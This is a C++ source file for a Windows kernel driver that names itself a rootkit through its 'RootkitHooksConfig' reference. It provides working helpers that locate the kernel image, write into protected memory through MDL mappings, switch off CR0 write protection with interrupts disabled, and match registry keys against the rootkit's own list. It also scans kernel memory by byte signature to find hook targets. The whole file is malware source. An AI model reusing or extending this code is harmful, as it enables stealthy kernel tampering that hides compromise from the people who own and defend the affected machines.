#include "Utils.h"

BOOLEAN GetNtoskrnl(ULONG_PTR* kernelBase, SIZE_T* kernelSize)
{

    NTSTATUS status;
    ULONG modulesSize;
    AUX_MODULE_EXTENDED_INFO* modules;
    ULONG numberOfModules;

    AuxKlibInitialize();


    status = AuxKlibQueryModuleInformation(
        &modulesSize,
        sizeof(AUX_MODULE_EXTENDED_INFO),
        NULL
    );

    if (!NT_SUCCESS(status) || modulesSize == 0) {
        return FALSE;
    }

    numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);

    modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePool(PagedPool, modulesSize);
    if (modules == NULL) {
        return FALSE;
    }

    RtlZeroMemory(modules, modulesSize);


    status = AuxKlibQueryModuleInformation(
        &modulesSize,
        sizeof(AUX_MODULE_EXTENDED_INFO),
        modules);

    if (!NT_SUCCESS(status)) {
        ExFreePool(modules);
        return FALSE;
    }


    *kernelBase = reinterpret_cast<ULONG_PTR>(modules[0].BasicInfo.ImageBase);
    *kernelSize = modules[0].ImageSize;

    ExFreePool(modules);

    return TRUE;
}


NTSTATUS SuperCopyMemory(
    IN VOID UNALIGNED* Destination,
    IN CONST VOID UNALIGNED* Source,
    IN ULONG Length)
{
    //Change memory properties.
    PMDL g_pmdl = IoAllocateMdl(Destination, Length, 0, 0, NULL);
    if (!g_pmdl)
        return STATUS_UNSUCCESSFUL;
    MmBuildMdlForNonPagedPool(g_pmdl);
    unsigned int* Mapped = (unsigned int*)MmMapLockedPages(g_pmdl, KernelMode);
    if (!Mapped)
    {
        IoFreeMdl(g_pmdl);
        return STATUS_UNSUCCESSFUL;
    }
    KIRQL kirql = KeRaiseIrqlToDpcLevel();
    RtlCopyMemory(Mapped, Source, Length);
    KeLowerIrql(kirql);
    //Restore memory properties.
    MmUnmapLockedPages((PVOID)Mapped, g_pmdl);
    IoFreeMdl(g_pmdl);
    return STATUS_SUCCESS;
}

KIRQL WPOFFx64()
{
    KIRQL irql = KeRaiseIrqlToDpcLevel();
    UINT64 cr0 = __readcr0();
    cr0 &= 0xfffffffffffeffff;
    __writecr0(cr0);
    _disable();
    return irql;
}

void WPONx64(KIRQL irql)
{
    UINT64 cr0 = __readcr0();
    cr0 |= 0x10000;
    _enable();
    __writecr0(cr0);
    KeLowerIrql(irql);
}


NTSTATUS GetKeyName(HANDLE keyHandle, PKEY_NAME_INFORMATION* keyNameInfo)
{
    ULONG nameInfoLength = 0;

    auto infoStatus = ZwQueryKey(keyHandle, KEY_INFORMATION_CLASS::KeyNameInformation, NULL, 0, &nameInfoLength);

    if (infoStatus == STATUS_BUFFER_TOO_SMALL)
    {
        *keyNameInfo = reinterpret_cast<PKEY_NAME_INFORMATION>(ExAllocatePool(NonPagedPool, nameInfoLength));

        if (!(*keyNameInfo))
        {
            return STATUS_FAIL_CHECK;
        }

        infoStatus = ZwQueryKey(keyHandle, KEY_INFORMATION_CLASS::KeyNameInformation, *keyNameInfo, nameInfoLength, &nameInfoLength);

        if (!NT_SUCCESS(infoStatus))
        {
            ExFreePool(*keyNameInfo);
        }
    }

    return infoStatus;
}


NTSTATUS CheckReqForMatchRegisterInList(HANDLE keyHandle, OUT RegistryKey& key)
{
	PKEY_NAME_INFORMATION nameInfo;
	auto statusInfo = GetKeyName(keyHandle, &nameInfo);

	if (!NT_SUCCESS(statusInfo))
	{
		return STATUS_FAIL_CHECK;
	}

	auto finder = [&nameInfo](RegistryKey key)
	{
		return key.registryLength == nameInfo->NameLength && (RtlCompareMemory(key.registryName, nameInfo->Name, key.registryLength) == key.registryLength);
	};

    key = RootkitHooksConfig::getInstance().GetRegistryList().Find(finder);

	if (key.registryLength)
	{
		return STATUS_SUCCESS;
	}
	else
	{
		return STATUS_FAIL_CHECK;
	}
}


BOOL wstrnotnull(WSTRING str, WSTRING substr)
{

    SIZE_T substrLen = substr.length / 2;
    for (SIZE_T i = 0; i < (str.length - substr.length) / 2; i++)
    {
        if (wcsncmp(&str.buffer[i], substr.buffer, substrLen) == 0)
        {
            return TRUE;
        }
    }

    return FALSE;
}

void PrintNonullStr(PWCHAR buffer, ULONGLONG length)
{
    auto last = buffer[length / 2 - 1];
    buffer[length / 2 - 1] = 0;
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "%S\n", buffer);
    buffer[length / 2 - 1] = last;
}

ULONG_PTR findBySignature(PBYTE baseAddres, SIZE_T baseLenght, PBYTE pattern, SIZE_T patternLenght)
{

    for (SIZE_T i = 0; i < baseLenght - patternLenght; i++)
    {
        if (!memcmp((PBYTE)(baseAddres + i), pattern, patternLenght))
        {
            return (ULONG_PTR)baseAddres + i;
        }
    }

    return {};
}
